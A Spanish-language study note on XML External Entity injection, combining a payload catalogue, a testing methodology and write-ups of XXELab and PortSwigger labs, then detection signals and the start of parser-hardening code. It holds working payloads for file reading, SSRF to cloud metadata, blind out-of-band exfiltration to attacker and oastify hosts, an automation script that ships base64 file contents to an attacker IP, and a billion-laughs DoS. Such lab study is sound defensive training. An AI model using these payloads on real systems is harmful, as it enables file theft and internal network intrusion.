---
tags:
  - ciberseguridad
  - web
  - xml-injection
tipo: concepto
estado: terminado
---

# XML External Entity (XXE) Injection

**XXE Injection** ocurre cuando una aplicación parsea XML **resolviendo entidades externas** y el atacante controla el DOCTYPE: el parser del servidor interpreta `<!ENTITY xxe SYSTEM "file:///etc/passwd">` como una orden de lectura, no como texto. El impacto va desde lectura de archivos locales hasta SSRF, exfiltración out-of-band, DoS (billion laughs) y, en configuraciones concretas, RCE (wrappers como `expect://` en PHP).

> [!info] ¿Qué es XML?
> XML (*Extensible Markup Language*) es un lenguaje de marcado sin etiquetas predefinidas: la jerarquía de elementos, atributos y texto forma un árbol. Su flexibilidad (DOCTYPE, entidades, referencias externas) es exactamente lo que XXE explota: el parser **resuelve referencias declaradas por el documento**, y si el atacante redacta esas referencias, el parser del servidor obedece.

## Mecánica: entidades, DTD y cómo el parser se dispara

### Anatomía de un documento XML

```xml
<?xml version="1.0" encoding="UTF-8"?>  <!-- prologo -->
<!DOCTYPE stock [ ... ]>                <!-- declaración de tipo: DTD inline -->
<stock><productId>1</productId></stock> <!-- elemento raíz + jerarquía de nodos -->
```

El parser construye un árbol de nodos (elementos, atributos, texto) y, **antes** de devolverlo, resuelve las referencias de entidades declaradas en el DOCTYPE.

### Tipos de entidad

| Tipo | Sintaxis | Resolución | Ejemplo |
|---|---|---|---|
| Interna | `<!ENTITY foo "bar">` | Literal, en el propio documento | `&foo;` → `bar` |
| **Externa** (`SYSTEM`) | `<!ENTITY foo SYSTEM "uri">` | El parser **abre la URI**: `file://`, `http://`, wrappers | `&foo;` → contenido del recurso |
| Externa (`PUBLIC`) | `<!ENTITY foo PUBLIC "id" "uri">` | Como `SYSTEM` + identificador público | Catálogos DTD |
| **Parámetro** (`%`) | `<!ENTITY % foo "bar">` | Solo dentro del DTD; se expande con `%foo;` | Cadena OOB |
| Predefinida | `&amp; &lt; &gt; &quot; &apos;` | Fijas | Escaping |

El **DTD** (*Document Type Definition*) es la lista de reglas y entidades del documento; vive inline (`<!DOCTYPE foo [ ... ]>`) o se referencia externamente (`<!DOCTYPE foo SYSTEM "http://evil/x.dtd">`). **Toda la superficie XXE vive en esa sección**: si controlás el DOCTYPE, controlás qué abre el parser.

### El error del desarrollador

```java
// ❌ Java: parser por defecto, DTD y entidades externas activas
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
```
```php
// ❌ PHP legacy (< libxml 2.9 / sin flags): entidades externas resolubles
simplexml_load_string($xml);
```
```csharp
// ❌ .NET legacy: XmlDocument con DtdProcessing=Parse y XmlResolver activo
var doc = new XmlDocument(); doc.LoadXml(input);
```

## Catálogo de payloads XXE

### 1. Lectura de archivos (in-band: el contenido vuelve en la respuesta)

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><email>&xxe;</email></root>
```

| Entorno | Recurso |
|---|---|
| Linux | `file:///etc/passwd`, `file:///etc/hostname` |
| Windows | `file:///C:/Windows/win.ini` |
| PHP (evita romper el parseo) | `php://filter/convert.base64-encode/resource=/etc/passwd` |
| Java | `file:///etc/passwd` (a veces requiere `netdoc:///`) |

### 2. SSRF / escaneo interno

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```

Metadata cloud, intranet y servicios localhost — ver [[Server-Side Request Forgery (SSRF)]].

### 3. Blind XXE OOB con entidades de parámetro (exfiltración)

DTD externo alojado por el atacante (`evil.dtd`):

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?f=%file;' >">
%eval;
%exfil;
```

Petición víctima:

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd"> %xxe; ]>
```

Por qué los escapes: `%` dentro de una entidad declarada debe escribirse `&#x25;` (si no, el parser intenta expandir `%exfil;` **antes** de declararlo ⇒ error); igual para `&` → `&#x26;` y `'` → `&#x27;`. El orden importa: primero `%eval;` (declara `exfil`), después `%exfil;` (la usa).

### 4. Blind XXE por mensajes de error

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; request SYSTEM 'file:///nonexistent/%file;' >">
%eval;
%request;
```

El error `failed to open '/nonexistent/root:x:0:0:...'` devuelve el contenido en la respuesta.

### 5. Repurposing de DTD local (sin poder servir DTDs externos)

Cargás un DTD del propio sistema que contenga una entidad redefinible (p. ej. `ISOamso` en `/usr/share/yelp/dtd/docbookx.dtd`, presente en GNOME/Yelp) y la redefinís con tu cadena OOB/error-based, anidando las declaraciones dentro de la nueva definición.

### 6. XInclude (cuando el DOCTYPE está bloqueado)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### 7. SVG / políglotos (XXE por subida de archivo)

```svg
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="512" height="512">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

Subilo como avatar y abrí la imagen en otra pestaña: el contenido aparece renderizado. Variantes del mismo vector: XML en `Content-Type: application/xml` enviado a endpoints JSON (basta cambiar el header — ver [[Abuso de APIs]]), docx/xlsx (ZIP con `word/document.xml`), feeds RSS/Atom, envelopes SOAP.

### 8. DoS: Billion Laughs

```xml
<!DOCTYPE lolz [ <!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;...x10"> ... ]><lolz>&lol9;</lolz>
```

Expansión exponencial de entidades — solo en entornos autorizados.

## Metodología de testing

1. **Localizar parseo XML**: `Content-Type: application/xml`, `text/xml`, `application/soap+xml`; formularios "check stock"; subidas de avatar/feeds; APIs que acepten XML (probar `Accept: application/xml` y cambiar el `Content-Type`).
2. **Confirmar el parseo**: payload con error de sintaxis — ¿500 o mensaje del parser? Entonces parsea.
3. **Probar entidad interna** (control total del DOCTYPE): `<!DOCTYPE foo [<!ENTITY myName "stark">]><x>&myName;</x>` reflejado ⇒ entidades activas.
4. **Sistema de archivos**: `file:///etc/passwd` (Linux) / `file:///C:/Windows/win.ini` (Windows); en PHP encadena `php://filter` base64.
5. **Si la respuesta no refleja** → blind: primero OOB interaction al Collaborator (`SYSTEM "http://COLLABORATOR"`), luego exfil con DTD externo + entidades de parámetro.
6. **Si no podés servir DTDs externos** → error-based o repurposing de DTD local.
7. **Si el DOCTYPE está prohibido** → XInclude / SVG / SOAP / endpoints JSON-XML.
8. **Escalada**: SSRF a metadata (169.254.169.254), lectura de configs/claves, DoS.

## Conceptos, práctica y laboratorios originales de clase

A continuación se conservan íntegramente las notas originales (XXELab + PortSwigger) con sus capturas:

Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, nos referimos a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

> [!info] ¿Qué es XML?
> XML (Extensible Markup Language) es un lenguaje de marcado diseñado para almacenar y transportar datos. A diferencia de HTML, XML no tiene etiquetas predefinidas; las etiquetas se definen por el usuario. Su estructura jerárquica, similar a un árbol, facilita la representación de datos complejos y su intercambio entre diferentes sistemas.

Un ataque XXE generalmente implica la inyección de una **entidad** XML maliciosa en una solicitud HTTP, que es procesada por el servidor y puede resultar en la exposición de información sensible. Por ejemplo, un atacante podría inyectar una entidad XML que hace referencia a un archivo en el sistema del servidor y obtener información confidencial de ese archivo.

Un caso común en el que los atacantes pueden explotar XXE es cuando el servidor web no valida adecuadamente la entrada de datos XML que recibe. En este caso, un atacante puede inyectar una entidad XML maliciosa que contiene referencias a archivos del sistema a los que el servidor tiene acceso. Esto puede permitir que el atacante obtenga información sensible del sistema, como contraseñas, nombres de usuario, claves de API, entre otros datos confidenciales.

> [!warning] Riesgos de XXE
> La explotación de XXE puede llevar a:
> -   **Divulgación de archivos locales**: Acceso a `/etc/passwd`, `/etc/shadow`, archivos de configuración, claves SSH.
> -   **Ejecución remota de código (RCE)**: En algunos casos, si se combinan con otras vulnerabilidades o configuraciones específicas (como el uso de `expect://` wrapper en PHP).
> -   **Denegación de Servicio (DoS)**: Mediante la "bomba XML" (Billion Laughs Attack), que consume recursos del servidor.
> -   **Server-Side Request Forgery (SSRF)**: Como se explica más adelante, el servidor puede ser forzado a realizar peticiones a recursos internos o externos.

Cabe destacar que, en ocasiones, los ataques XML External Entity (XXE) Injection no siempre resultan en la exposición directa de información sensible en la respuesta del servidor. En algunos casos, el atacante debe “**ir a ciegas**” (Blind XXE) para obtener información confidencial a través de técnicas adicionales.

Una forma común de “ir a ciegas” en un ataque XXE es enviar peticiones especialmente diseñadas desde el servidor para conectarse a un **Document Type Definition** (**DTD**) definido externamente. El DTD se utiliza para validar la estructura de un archivo XML y puede contener referencias a recursos externos, como archivos en el sistema del servidor.

> [!info] DTD (Document Type Definition)
> Un DTD define la estructura legal de un documento XML. Define la estructura del documento con una lista de elementos y atributos legales. Las entidades XML pueden ser declaradas dentro de un DTD, permitiendo la inclusión de contenido externo o la definición de atajos para texto repetitivo.

Este enfoque de “ir a ciegas” en un ataque XXE puede ser más lento y requiere más trabajo que una explotación directa de la vulnerabilidad. Sin embargo, puede ser efectivo en casos donde el atacante tiene una idea general de los recursos disponibles en el sistema y desea obtener información específica sin ser detectado.

Adicionalmente, en algunos casos, un ataque XXE puede ser utilizado como un vector de ataque para explotar una vulnerabilidad de tipo **SSRF** (**Server-Side Request Forgery**). Esta técnica de ataque puede permitir a un atacante escanear **puertos internos** en una máquina que, normalmente, están protegidos por un firewall externo.

Un ataque SSRF implica enviar solicitudes HTTP desde el servidor hacia direcciones IP o puertos internos de la red de la víctima. El ataque XXE se puede utilizar para desencadenar un SSRF al inyectar una entidad XML maliciosa que contiene una referencia a una dirección IP o puerto interno en la red del servidor.

Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a servicios internos que de otra manera no estarían disponibles para la red externa. Esto puede permitir al atacante obtener **información sensible** o incluso **tomar el control** de los servicios internos.

A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:

-   **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)

### Notas de práctica — XXELab (material original)

Una vez que tengamos desplegada la máquina, vamos a ver lo siguiente:
![[Pasted image 20250825092200.png]]

Lo primero que vamos a hacer es interceptar con ayuda de Burp Suite las peticiones de esta web:

![[Pasted image 20250825092455.png]]

Podemos ver que estamos procesando una estructura en XML, pero para comprender esto vamos a ver qué es `XML`:
![[Pasted image 20250825093131.png]]

Entonces, XML (Extensible Markup Language) se encarga de transportar datos siguiendo una estructura de árbol, y lo más común de ver son `etiquetas (tags)` y `Data (Datos)`.

Entonces, en nuestro caso, lo que vemos es cómo se transmite la estructura en XML y, en base a esto, la víctima o el servidor nos dará una respuesta.
![[Pasted image 20250825093252.png]]

Continuando con la máquina, vamos a enviar la petición al Repeater y la vamos a enviar para ver la respuesta:

![[Pasted image 20250825093427.png]]

Como podemos observar, nos dice que el correo ya se encuentra registrado. Vamos a alterar el campo para ver si esto está así por defecto o si nos deja continuar:

![[Pasted image 20250825093534.png]]

Vemos que sale lo mismo, lo que sugiere que esto está de alguna manera bloqueado. Ahora, lo que a nosotros nos interesa es que, al parecer, está tomando los valores de la etiqueta `email` y los está presentando en el mensaje.

Con esto, vamos a primero entender qué son las `entidades`:

![[Pasted image 20250825094633.png]]

Vemos un resumen total de lo que es, por lo que vamos a proseguir en la máquina.

Como ya vimos, el valor del `email` se representa en la parte de la respuesta. Lo que vamos a intentar ahora es que, con ayuda de las entidades, podamos ver información. Entonces, vamos a modificar de la siguiente manera:

![[Pasted image 20250825094924.png]]

Como vemos en la imagen, con ayuda de `DOCTYPE` definimos una entidad llamada `myName` con el valor de `stark` y luego la pasamos a `email` de la siguiente manera `&myName;`. Con esto, vemos que la web nos responde:

![[Pasted image 20250825095056.png]]

Vemos que somos capaces de crear una entidad y que su valor se represente en la respuesta. Aquí es donde nos aprovechamos del XXE de la siguiente manera:
![[Pasted image 20250825095234.png]]

Podemos ver en la imagen que, con ayuda de entidades externas y el uso de *wrappers*, logramos volcar la información del archivo `/etc/passwd`, donde ya explotamos el `XXE`.

> [!tip] Wrappers de PHP
> Los *wrappers* de PHP (`php://`) permiten acceder a varios protocolos de E/S. En el contexto de XXE, `php://filter` es particularmente útil para leer archivos locales y aplicar filtros de conversión. Por ejemplo, `php://filter/convert.base64-encode/resource=/etc/passwd` lee el archivo `/etc/passwd` y lo codifica en Base64, lo que ayuda a evitar problemas con caracteres especiales y a exfiltrar datos en entornos donde la salida directa está restringida.

Bueno, en el caso de que nosotros intentemos lo anterior y veamos que no logramos volcar la información, podremos intentar también un ataque del tipo `External DTD (XXE OOB)`:
![[Pasted image 20250825100252.png]]

Por lo tanto, volviendo a la máquina, vamos a suponer que la web no nos deja declarar entidades directamente y es allí donde aplicamos lo anterior de la siguiente manera:

Primero, nosotros podemos verificar si podemos realizar peticiones usando un servidor y viendo si la web realiza una petición:

![[Pasted image 20250825100626.png]]

![[Pasted image 20250825100637.png]]

En este caso, vemos que sí logramos realizar peticiones. Ahora, en el caso de que no podamos llamar entidades, vamos a crear y llamar a la entidad desde el propio `DTD` de la siguiente manera:

![[Pasted image 20250825100937.png]]

![[Pasted image 20250825100947.png]]

Vemos que la petición nos llega, por lo que desde el `DTD` logramos llamar a la entidad. Ya con esto, vamos a crear entidades externas alojadas en nuestro servidor, por lo que el `DTD` quedaría de la siguiente manera:

![[Pasted image 20250825101119.png]]

Ahora estamos tratando de llamar a un archivo llamado `malicious.dtd` en nuestro servidor, por lo que vamos a proceder a crearlo con el siguiente contenido, el cual, tomando en cuenta que no podemos ver el *output* en la respuesta, me va a enviar el contenido del `/etc/passwd` por una petición a mi servidor web en Base64:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.70/?file=%file;' >">
%eval;
%exfil;
```

El flujo es: creamos una entidad `file` la cual se encarga de almacenar la información en Base64. Luego, declaramos la entidad `eval` la cual se encargará de procesar una tercera entidad `exfil` la cual realizará la petición con el contenido en Base64 del `/etc/passwd` y la enviará a nuestro servidor. Por último, se llama a las entidades para que estas funcionen, ya que si no lo hacemos, no hará nada.

> [!info] Entidades de Parámetro XML (`%`)
> Las entidades de parámetro son un tipo especial de entidad XML que solo pueden ser referenciadas dentro de un DTD. Se declaran con un `%` antes del nombre de la entidad (ej. `<!ENTITY % nombre "valor">`) y se referencian de la misma manera (ej. `%nombre;`). Son cruciales para construir payloads XXE complejos, especialmente en ataques *out-of-band* (OOB) o cuando se necesita anidar entidades.
>
> **Codificación de caracteres especiales en DTDs**:
> -   `%` se codifica como `&#x25;`
> -   `&` se codifica como `&#x26;`
> -   `'` se codifica como `&#x27;`
> -   `"` se codifica como `&#x22;`
> Esta codificación es necesaria para evitar que el parser XML interprete estos caracteres como parte de la sintaxis del DTD en contextos donde no deberían serlo, permitiendo la expansión correcta de las entidades.

Ahora dejamos el servidor corriendo y mandamos la solicitud a ver si podemos obtener la información:

![[Pasted image 20250825102121.png]]

Vemos que al servidor llega primero la solicitud de `malicious.dtd` y luego, que interpreta eso, nos llega la información en Base64, por lo que vamos a ver si tiene el contenido que esperamos:
![[Pasted image 20250825102235.png]]

Como podemos observar, ya tenemos el contenido del archivo y esto lo podemos replicar para cualquier archivo.
Ahora, como algo extra, nosotros podemos crear un *script* para automatizar esto de la siguiente manera:

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename #le pedimos la ruta de archivo al usuario para que sea dinamico.

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.70/?file=%file;' >\">
%eval;
%exfil;
"""

echo "$malicious_dtd" > malicious.dtd

python3 -m http.server 80 &> response & # almacenamos todo en response y lo ejecutamos en segundo plano

PID=$! # almacena el PID del comando ejecutado antes

sleep 1

curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.70/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>0999999999</tel><email>
stark@stark.com</email><password>stark1234</password></root>' &>/dev/null

kill -9 "$PID"          # matamos el proceso
wait "$PID" 2>/dev/null # esperamos a que el proceso muera

echo -e "\n\n[+] Contenido del Archivo:\n\n"

cat response | grep -oP 'file=\K[^ ]+' | base64 -d
echo
```

Ya con este *script* logramos automatizar esto y ver archivos del sistema:

![[Pasted image 20250825104304.png]]

#### Laboratorios PortSwigger (notas originales de clase)

#### Lab: Exploiting XXE using external entities to retrieve files

La vulnerabilidad está en el momento en que se procesa la petición para ver el *stock* de un producto, y si capturamos esta petición, lo que vamos a ver es lo siguiente:
![[Pasted image 20250916102548.png]]

Vamos a intentar cambiar el `productId` por otro valor a ver qué sucede:
![[Pasted image 20250916102715.png]]

Vemos que se refleja el valor de `test`, pero no obtenemos mucha información. En este caso, vamos a intentar inyectar entidades externas a ver qué logramos:

![[Pasted image 20250916103034.png]]

Como podemos observar, logramos crear una entidad externa llamada `myName` con el valor de `stark` y, al definirla en la estructura, vemos el valor de esa variable. Ahora nos pide que listemos un archivo. Nosotros podemos hacer uso de *wrappers* para extraer información de la web:
![[Pasted image 20250916103307.png|1235]]
Perfecto, con ayuda del *wrapper* `file` se insertó el contenido de `/etc/passwd` de la máquina víctima.

![[Pasted image 20250916103344.png]]

Lab Terminado.

#### Lab: Exploiting XXE to perform SSRF attacks

Al parecer, la máquina está empleando un EC2, el cual no es más que computadoras virtuales donde se ejecutan las aplicaciones.

Bueno, el objetivo es lograr que la máquina realice una cadena de peticiones hasta obtener una clave privada de administrador. Primero, interceptamos la petición; en sí, se procesa al momento de revisar los productos disponibles:
![[Pasted image 20250916113139.png]]

En este punto, vamos a intentar hacer llamados con ayuda de `SYSTEM` mediante un `DTD`:
![[Pasted image 20250916113327.png]]

El hecho de que nos dé una respuesta clara y no un error en seco nos indica que algo está tratando de abrir o nos está listando algo. Lo posible son más directorios, por lo que vamos a ir agregando los diferentes directorios que nos den hasta llegar a algo concreto:
![[Pasted image 20250916113446.png]]
![[Pasted image 20250916113504.png]]
![[Pasted image 20250916113528.png]]
![[Pasted image 20250916113559.png]]
![[Pasted image 20250916113638.png]]

Perfecto, vemos el contenido de los diferentes archivos.
![[Pasted image 20250916113705.png]]
Lab Terminado.

#### Lab: Blind XXE with out-of-band interaction

Bueno, en este caso tenemos igual una máquina con una XXE vulnerable, pero a ciegas; no tendremos dónde ver los errores y tampoco los veremos reflejados en ningún lado.

La vulnerabilidad está en el mismo sitio, así que vamos a capturarla primero:
![[Pasted image 20250916114119.png]]

En la imagen, ya intenté una inyección, pero en este caso no vemos absolutamente nada.

El objetivo en este caso es relativamente sencillo, ya que solo vamos a enviar una solicitud mediante un XXE al Collaborator de Burp Suite, por lo tanto, lo vamos a hacer:
![[Pasted image 20250916115725.png]]

![[Pasted image 20250916115737.png]]

Listo, máquina resuelta.
![[Pasted image 20250916115750.png]]
Lab Completado.

#### Lab: Blind XXE with out-of-band interaction via XML parameter entities

En esta máquina vamos a ver cómo tenemos que usar los parámetros de entidades para poder filtrar la información en casos como este donde no se pueda ver la información.

Ya sabemos dónde está, así que vamos a capturar la petición:
![[Pasted image 20250916123416.png]]

Vemos que en realidad esto ya no funciona debido a que lo que se emplean son entidades externas. Ahora, esto lo podemos cambiar a hacer entidades de parámetro de la siguiente manera:
![[Pasted image 20250916123722.png]]

Vemos que, aunque no tenemos el *output* visible por algún lado, no tenemos errores y esto es una buena señal. Ahora vamos a hacer de la misma manera una petición al Burp Suite Collaborator con el objetivo de ver si se ejecuta de forma correcta:
![[Pasted image 20250916124207.png]]
![[Pasted image 20250916124248.png]]

Perfecto, vemos la petición sin problema.
![[Pasted image 20250916124314.png]]
Con esto, Lab Terminado.

#### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

En este laboratorio se complica un poco y sigue siendo a ciegas, por lo que ahora vamos a tener que filtrar la información.

Capturamos de igual forma la petición inicial para ver qué es lo que tenemos:
![[Pasted image 20250916130544.png]]

Luego de unas pruebas, lo que vemos es que sí podemos hacer peticiones, como al Collaborator:
![[Pasted image 20250916130621.png]]

Perfecto, en este punto lo que tenemos que hacer es tratar de extraer datos.

Bueno, el laboratorio cuenta con el `exploit server`, así que vamos a cambiar la petición y vamos a ver si podemos enviar solicitudes hacia allá:
![[Pasted image 20250916130838.png]]
![[Pasted image 20250916130848.png]]

Sí se realizan las peticiones. En este punto, lo que vamos a hacer es crear un archivo externo el cual sea interpretado y nos permita el envío de los datos, y el código es de la siguiente manera:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://nwnpswczd30pylzx2c6qfouttkzbn4bt.oastify.com/?content=%file;'>">
%eval;
%exfil;
```

Veamos, en la primera línea estamos definiendo el parámetro `file` el cual se encarga de hacer el llamado al contenido del archivo `hostname`. En la siguiente línea, definimos la entidad `eval` la cual va a contener una entidad interna donde `&#x25;` es la forma de representar un `%`. La razón por la que lo hacemos de esta manera es debido a que si usamos el `%` al definir la entidad interna `exfil`, lo que se puede o suele interpretar es que se está expandiendo la entidad `exfil` y, al no tener una declaración previa, esto resultaría en un error. Entonces, al declararla tal y como lo vemos, lo que provoca es que se interprete como un `%`. Como dato extra, si es necesario representar alguna otra cosa que no requiere interpretación o que da error, lo podemos hacer con `&#x` y le aumentamos el valor del signo en hexadecimal. En este caso, lo que tenemos es `% -> 25`, entonces queda `&#x25;`. Ahora, en esta entidad interna de `exfil`, lo que se hace es realizar una petición, en nuestro caso al Collaborator, pero dentro de esta petición expandimos la entidad de `file` lo que permite enviar su contenido. Por último, para que esto funcione, necesitamos expandir la entidad de `eval` primero, esto debido a que si expandimos la entidad de `exfil` no se va a reconocer ya que esta pertenece a `eval`. Una vez se expande `eval`, expandimos `exfil` y esto debería funcionar de forma correcta.

Ahora vamos a realizar la consulta desde Burp Suite al servidor *exploit* para que se ejecute y ver qué obtenemos:

![[Pasted image 20250916132821.png]]
![[Pasted image 20250916132836.png]]
![[Pasted image 20250916132852.png]]

Perfecto, usamos el contenido para cargar la solución y listo.
![[Pasted image 20250916132932.png]]

Máquina Terminada.

#### Lab: Exploiting blind XXE to retrieve data via error messages

En esta ocasión, lo que vamos a hacer es aprovecharnos de los errores para poder obtener información mediante estos.

Vamos a comenzar, como siempre, capturando la petición que contiene la vulnerabilidad:
![[Pasted image 20250916160640.png]]
Perfecto, vamos a jugar con diferentes inyecciones a ver qué logramos:
![[Pasted image 20250916161351.png]]
Vemos que con la petición que tenemos nos inserta el nombre de la web inválida que intentó cargar. Esto nos puede servir en realidad, ya que si lo pensamos y luego de un error nos inserta texto, podemos intentar con un archivo malicioso externo para jugar con más declaraciones y ver si podemos insertar la información que queremos:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; request SYSTEM 'file://nofunciona/%file;'>">
%eval;
%request;
```

De forma general, lo que estamos haciendo es aprovechar cuando el error acontece al no encontrar lo que se busca y nos indica la información del archivo que se busca. Lo que hacemos es que la información primero se solicite y luego se inserte, y ya con esto logramos obtener la información:
![[Pasted image 20250916162150.png]]
![[Pasted image 20250916162200.png]]
Perfecto, ya tenemos la información en el *output*.
![[Pasted image 20250916162240.png]]

Lab Terminado.

#### Lab: Exploiting XInclude to retrieve files

Este laboratorio contiene un XInclude, el cual es un mecanismo de reconocimiento e inclusión de XML. Cuando se emplea, usualmente no vamos a ver las típicas etiquetas XML, por lo que es una buena idea probar este vector de ataque.

> [!info] XInclude
> XInclude es una recomendación del W3C que permite a los documentos XML incluir información de otros documentos XML o de texto plano. A diferencia de las entidades XML, XInclude es un mecanismo de procesamiento a nivel de aplicación que se ejecuta *después* de que el documento XML ha sido parseado. Esto significa que puede ser útil en escenarios donde las entidades XML están deshabilitadas o no son procesadas, o cuando se necesita incluir contenido no XML. La sintaxis típica es `<xi:include href="file:///path/to/file" parse="text"/>`.

Bueno, vamos a comenzar capturando la petición para ver cómo es que se están empleando en esta ocasión:

![[Pasted image 20250916165420.png]]

Como podemos observar, no se ven las etiquetas habituales. Por lo tanto, como atacantes, suponemos que se está procesando o haciendo uso de XML y este implementa el XInclude. Aquí podemos ayudarnos de webs externas para ver cómo es la inyección y nos queda de la siguiente manera:
![[Pasted image 20250916165618.png]]

Esto también es válido cuando no podemos modificar cosas como `DOCTYPE`.
Con esto debería estar la máquina resuelta.

#### Lab: Exploiting XXE via image file upload

En este laboratorio vamos a ver cómo podemos emplear un XXE mediante la subida de un archivo.

En este caso, cambia el punto donde se está inyectando la vulnerabilidad, y es que, al ser por subida de archivos, lo que nosotros vamos a ver es un punto donde podemos subir un avatar el cual queramos usar:
![[Pasted image 20250916165940.png]]
Rápidamente, lo que podemos hacer es buscar en la biblioteca de *payloads* `PayloadsAllTheThings` y ver si tenemos alguna forma de usar esta vulnerabilidad:
![[Pasted image 20250916170253.png]]

Vemos que sí, y vamos a usar el clásico para crear un archivo malicioso que vamos a subir a ver qué sucede:
![[Pasted image 20250916170420.png]]
Podemos observar que no es necesario cambiar el nombre del archivo. Además, lo insertamos tal cual. En este caso, el objetivo es ver el hostname, pero si la técnica funciona, es cuestión de modificar el *payload* para obtener la información deseada.
![[Pasted image 20250916170630.png]]

No se ve del todo, pero allí está la imagen representada. Es cuestión de hacer clic derecho y ver la imagen en otra pestaña para que se vea mucho más grande:
![[Pasted image 20250916170756.png]]

Vemos que ya tenemos el contenido del hostname. Con esto vamos a lograr completar la máquina:
![[Pasted image 20250916170916.png]]
Lab Terminado.

#### Lab: Exploiting XXE to retrieve data by repurposing a local DTD

En este laboratorio tenemos que cargar el contenido del `/etc/passwd`. Una de las restricciones de este laboratorio es que no podemos cargar DTD de forma externa, como lo hicimos en un laboratorio anterior.

Los sistemas que tienen como entorno GNOME usualmente tienen un DTD en `/usr/share/yelp/dtd/docbookx.dtd` que contiene una entidad llamada `ISOamso`.

En este caso, vamos a aprovecharnos de este tipo de entidad interna válida para intentar hacer cositas.

Vamos a comenzar interceptando la petición:
![[Pasted image 20250916171700.png]]

En este punto, lo que se debe probar es todo lo aprendido, y cuando no queden más opciones, se puede intentar referenciar entidades internas:
![[Pasted image 20250916172003.png]]

Vemos que los errores se reportan y podemos intentar aprovecharnos de ellos para insertar allí el contenido. Ahora, el problema es que no podemos usar archivos DTD externos, por lo que tenemos que representar todo en la misma petición de la siguiente manera:
```dtd
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; exfil SYSTEM &#x27;file:///noexito/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;exfil;
' >
%local_dtd;
]>
```

Vamos a comprender el código por completo. Primero, cargamos el documento que contiene el DTD local como entidad, esto en la segunda línea. A continuación, reasignamos el valor a la entidad `ISOamso` en ese documento, y lo que vamos a cambiar es simplemente todo el código que ya conocemos para DTD externo; es exactamente lo mismo. Ahora, explicamos lo de `&#x26;#x25;`: se está representando el `%`. La razón es que, dado que ya utilizamos el `&` para representar el `%` en la declaración anterior, en esta ocasión debemos representar el `&` en hexadecimal (`&#x26;`). Además, para evitar problemas, las comillas simples (`'`) se representaron como `&#x27;`. Finalmente, al llamar a las entidades, también representamos el `%` como hexadecimal (`&#x25;`). Expandimos y vamos a copiar esto en la petición para ver qué logramos:

![[Pasted image 20250916175557.png]]

Perfecto, vemos que obtenemos en la respuesta el contenido del `/etc/passwd`.
![[Pasted image 20250916175644.png]]
Lab Terminado.
## Detección

| Señal | Qué indica |
|---|---|
| 500 con error de parser al tocar el DOCTYPE | Parser XML activo; posible fixea de sintaxis |
| Reflejo de valor de entidad interna | Entidades resueltas ⇒ XXE in-band viable |
| Petición saliente al Collaborator | XXE blind con interacción OOB |
| Error `failed to open '/nonexistent/<contenido>'` | Error-based blind XXE |
| Imagen SVG renderizada con texto extraño | XXE por subida de archivo |
| Latencia alta con DTD externo | Fetch remoto del parser (SSRF) |

## Impacto y riesgo

- **Lectura de archivos** del servidor: `/etc/passwd`, configs, claves privadas (labs: clave del admin vía metadata/SSRF).
- **SSRF** interno y a cloud metadata — ver [[Server-Side Request Forgery (SSRF)]].
- **DoS** por expansión de entidades (billion laughs / quadratic blowup).
- **RCE** en nichos históricos: PHP `expect://`, parsers XML dentro de cadenas de [[Ataques de Deserialización]].
- **Exfiltración OOB** sin respuesta visible: el dato sale por HTTP desde el propio servidor.

## Defensa (con código)

### 1. Deshabilitar DTDs y entidades en el parser — la defensa real

```java
// Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // ✅ mata XXE de raíz
// Si el DOCTYPE es obligatorio por la app:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
